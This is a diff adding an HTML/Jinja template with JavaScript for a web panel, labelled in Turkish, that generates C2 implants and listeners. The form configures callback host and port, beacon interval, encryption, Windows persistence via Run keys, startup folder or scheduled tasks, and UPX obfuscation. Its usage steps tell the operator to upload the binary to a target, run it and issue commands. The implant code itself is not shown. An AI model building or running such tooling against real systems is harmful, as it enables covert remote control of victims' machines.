@@ -1,0 +1,369 @@
+{% extends "base.html" %}
+{% block head %}
+    <style>
+        :root {
+            --primary: #00ff00;
+            --danger: #ff3333;
+            --warning: #ffaa00;
+            --info: #00aaff;
+            --purple: #9933ff;
+        }
+        body {
+            background: #0f0f23;
+            color: #eee;
+        }
+        .card {
+            background: rgba(30, 30, 46, 0.95);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        .card-title {
+            color: var(--primary);
+            border-bottom: 1px solid rgba(0, 255, 0, 0.3);
+            padding-bottom: 10px;
+        }
+        .form-control {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(0, 255, 0, 0.5);
+            color: #fff;
+        }
+        .form-control:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+        }
+        .btn-c2 {
+            background: linear-gradient(90deg, #9933ff, #6600cc);
+            border: none;
+            color: white;
+            font-weight: bold;
+        }
+        .btn-c2:hover {
+            box-shadow: 0 0 20px rgba(153, 51, 255, 0.5);
+        }
+        .result-box {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--purple);
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+        }
+        .option-group {
+            border: 1px dashed rgba(153, 51, 255, 0.5);
+            border-radius: 5px;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        .option-title {
+            color: var(--purple);
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .listener-box {
+            background: rgba(153, 51, 255, 0.1);
+            border: 1px solid var(--purple);
+            border-radius: 5px;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        .step-box {
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            background: rgba(0, 0, 0, 0.3);
+        }
+        .step-box.success {
+            border-left: 4px solid var(--primary);
+        }
+        .step-box.error {
+            border-left: 4px solid var(--danger);
+        }
+        .implant-preview {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            overflow-x: auto;
+        }
+    </style>
+{% endblock %}
+{% block body %}
+    <nav class="navbar navbar-expand-lg sticky-top" style="background: rgba(0, 0, 0, 0.9); border-bottom: 2px solid #9933ff;">
+        <div class="container-fluid">
+            <a class="navbar-brand" style="color: #9933ff; font-weight: bold;" href="/">
+                <i class="bi bi-cpu-fill"></i> C2 IMPLANT
+            </a>
+            <div class="d-flex">
+                <a href="/" class="btn btn-outline-light btn-sm me-2"><i class="bi bi-house"></i> Dashboard</a>
+                <span class="navbar-text text-white"><i class="bi bi-person-circle"></i> {{ session.get('user') }}</span>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container-fluid mt-4">
+        <div class="row">
+            <div class="col-lg-6">
+                <div class="card">
+                    <div class="card-body">
+                        <h4 class="card-title">
+                            <i class="bi bi-gear"></i> Implant Konfigürasyonu
+                        </h4>
+                        
+                        <div class="row">
+                            <div class="col-md-6 mb-3">
+                                <label class="form-label">Implant Adı</label>
+                                <input type="text" id="implantName" class="form-control" value="implant" placeholder="implant">
+                            </div>
+                            <div class="col-md-6 mb-3">
+                                <label class="form-label">LHOST</label>
+                                <input type="text" id="lhostInput" class="form-control" value="192.168.1.100" placeholder="192.168.1.100">
+                            </div>
+                        </div>
+                        
+                        <div class="row">
+                            <div class="col-md-6 mb-3">
+                                <label class="form-label">LPORT</label>
+                                <input type="number" id="lportInput" class="form-control" value="4444" placeholder="4444">
+                            </div>
+                            <div class="col-md-6 mb-3">
+                                <label class="form-label">Beacon Interval (saniye)</label>
+                                <input type="number" id="intervalInput" class="form-control" value="30" placeholder="30">
+                            </div>
+                        </div>
+                        
+                        <div class="option-group">
+                            <div class="option-title">Şifreleme</div>
+                            <div class="form-check">
+                                <input class="form-check-input" type="radio" name="encryption" id="encAES" value="aes256" checked>
+                                <label class="form-check-label" for="encAES">AES-256 (Önerilen)</label>
+                            </div>
+                            <div class="form-check">
+                                <input class="form-check-input" type="radio" name="encryption" id="encXOR" value="xor">
+                                <label class="form-check-label" for="encXOR">XOR</label>
+                            </div>
+                            <div class="form-check">
+                                <input class="form-check-input" type="radio" name="encryption" id="encNone" value="none">
+                                <label class="form-check-label" for="encNone">Şifreleme Yok</label>
+                            </div>
+                        </div>
+                        
+                        <div class="option-group">
+                            <div class="option-title">Kalıcılık (Persistence)</div>
+                            <div class="form-check">
+                                <input class="form-check-input" type="radio" name="persistence" id="persistReg" value="registry" checked>
+                                <label class="form-check-label" for="persistReg">Registry Run Key</label>
+                            </div>
+                            <div class="form-check">
+                                <input class="form-check-input" type="radio" name="persistence" id="persistStart" value="startup">
+                                <label class="form-check-label" for="persistStart">Startup Folder</label>
+                            </div>
+                            <div class="form-check">
+                                <input class="form-check-input" type="radio" name="persistence" id="persistTask" value="schtasks">
+                                <label class="form-check-label" for="persistTask">Scheduled Task</label>
+                            </div>
+                        </div>
+                        
+                        <div class="form-check mb-3">
+                            <input class="form-check-input" type="checkbox" id="obfuscateCheck">
+                            <label class="form-check-label" for="obfuscateCheck">UPX Obfuscation</label>
+                        </div>
+                        
+                        <button class="btn btn-c2 w-100" onclick="generateImplant()">
+                            <i class="bi bi-cpu-fill"></i> IMPLANT ÜRET
+                        </button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-body">
+                        <h4 class="card-title">
+                            <i class="bi bi-ear"></i> C2 Listener
+                        </h4>
+                        <p class="text-muted">Gelen bağlantıları dinle</p>
+                        
+                        <div class="row">
+                            <div class="col-md-6 mb-3">
+                                <label class="form-label">Listener LHOST</label>
+                                <input type="text" id="listenerLhost" class="form-control" value="0.0.0.0">
+                            </div>
+                            <div class="col-md-6 mb-3">
+                                <label class="form-label">Listener LPORT</label>
+                                <input type="number" id="listenerLport" class="form-control" value="4444">
+                            </div>
+                        </div>
+                        
+                        <button class="btn btn-outline-purple w-100" style="border-color: #9933ff; color: #9933ff;" onclick="createListener()">
+                            <i class="bi bi-ear"></i> LİSTENER OLUŞTUR
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-lg-6">
+                <div class="card">
+                    <div class="card-body">
+                        <h4 class="card-title">
+                            <i class="bi bi-terminal"></i> Sonuçlar
+                        </h4>
+                        <div id="resultsArea">
+                            <div class="text-muted text-center py-4">
+                                <i class="bi bi-cpu-fill" style="font-size: 3em; opacity: 0.3;"></i>
+                                <p class="mt-2">Implant üretmek için konfigürasyonu doldurun</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-body">
+                        <h4 class="card-title">
+                            <i class="bi bi-info-circle"></i> Nasıl Kullanılır?
+                        </h4>
+                        <div class="step-box">
+                            <h6>1. Listener Başlat</h6>
+                            <code>python3 /tmp/c2_listener_4444.py</code>
+                        </div>
+                        <div class="step-box">
+                            <h6>2. Implant Deploy Et</h6>
+                            <p>Üretilen binary'i hedef sisteme yükle ve çalıştır</p>
+                        </div>
+                        <div class="step-box">
+                            <h6>3. Beacon Bekle</h6>
+                            <p>Hedef sistemin beacon göndermesini bekle</p>
+                        </div>
+                        <div class="step-box">
+                            <h6>4. Komut Gönder</h6>
+                            <p>Listener üzerinden komut gönder ve sonuçları al</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-body">
+                        <h4 class="card-title">
+                            <i class="bi bi-list"></i> Üretilen Implant'lar
+                        </h4>
+                        <div id="implantsList">
+                            <div class="text-muted text-center py-2">
+                                <small>Henüz implant üretilmedi</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+{% endblock %}
+{% block scripts %}
+    <script>
+        async function generateImplant() {
+            const name = document.getElementById('implantName').value;
+            const lhost = document.getElementById('lhostInput').value;
+            const lport = document.getElementById('lportInput').value;
+            const interval = document.getElementById('intervalInput').value;
+            
+            const encryption = document.querySelector('input[name="encryption"]:checked').value;
+            const persistence = document.querySelector('input[name="persistence"]:checked').value;
+            const obfuscate = document.getElementById('obfuscateCheck').checked;
+
+            const resultsDiv = document.getElementById('resultsArea');
+            resultsDiv.innerHTML = '<div class="text-center py-4"><i class="bi bi-gear fa-spin" style="font-size: 2em; color: #9933ff;"></i><p>Implant üretiliyor...</p></div>';
+
+            try {
+                const res = await fetch('/c2/generate-full', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        name: name,
+                        lhost: lhost,
+                        lport: lport,
+                        interval: interval,
+                        encryption: encryption,
+                        persistence: persistence,
+                        obfuscate: obfuscate
+                    })
+                });
+                const data = await res.json();
+                
+                let html = '';
+                
+                if (data.success) {
+                    html += `<div class="step-box success">
+                        <h5 class="text-success">✅ BAŞARILI!</h5>
+                        <p>Implant başarıyla üretildi!</p>
+                    </div>
+                    
+                    <div class="listener-box">
+                        <h6><i class="bi bi-file-code"></i> Kaynak Kod:</h6>
+                        <code>${data.source_file}</code>
+                    </div>
+                    
+                    <div class="listener-box">
+                        <h6><i class="bi bi-cpu"></i> Binary:</h6>
+                        <code>${data.binary_file}</code>
+                    </div>
+                    
+                    <div class="listener-box">
+                        <h6><i class="bi bi-ear"></i> Listener Script:</h6>
+                        <code>${data.listener_file}</code>
+                    </div>
+                    
+                    <div class="option-group">
+                        <div class="option-title">Kullanım:</div>
+                        <p><strong>1. Listener Başlat:</strong></p>
+                        <code>python3 ${data.listener_file}</code>
+                        <p class="mt-2"><strong>2. Implant Deploy:</strong></p>
+                        <code>Upload ${data.binary_file} and execute</code>
+                    </div>`;
+                    
+                    // Update implants list
+                    updateImplantsList(data);
+                } else {
+                    html += `<div class="step-box error">
+                        <h5 class="text-danger">❌ HATA</h5>
+                        <p>${data.error}</p>
+                    </div>`;
+                }
+                
+                resultsDiv.innerHTML = html;
+                
+            } catch (e) {
+                resultsDiv.innerHTML = `<div class="step-box error"><p class="text-danger">Hata: ${e}</p></div>`;
+            }
+        }
+
+        async function createListener() {
+            const lhost = document.getElementById('listenerLhost').value;
+            const lport = document.getElementById('listenerLport').value;
+
+            try {
+                const res = await fetch('/c2/listener', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({lhost: lhost, lport: lport})
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    alert(`Listener oluşturuldu!\n\nDosya: ${data.listener_file}\nKomut: ${data.command}`);
+                } else {
+                    alert('Hata: ' + data.error);
+                }
+            } catch (e) {
+                alert('Hata: ' + e);
+            }
+        }
+
+        function updateImplantsList(data) {
+            const listDiv = document.getElementById('implantsList');
+            listDiv.innerHTML = `
+                <div class="d-flex justify-content-between align-items-center py-2" style="border-bottom: 1px solid #333;">
+                    <span><i class="bi bi-cpu"></i> ${data.config.name}</span>
+                    <span class="badge bg-success">${data.config.lhost}:${data.config.lport}</span>
+                </div>
+            `;
+        }
+    </script>
+{% endblock %}
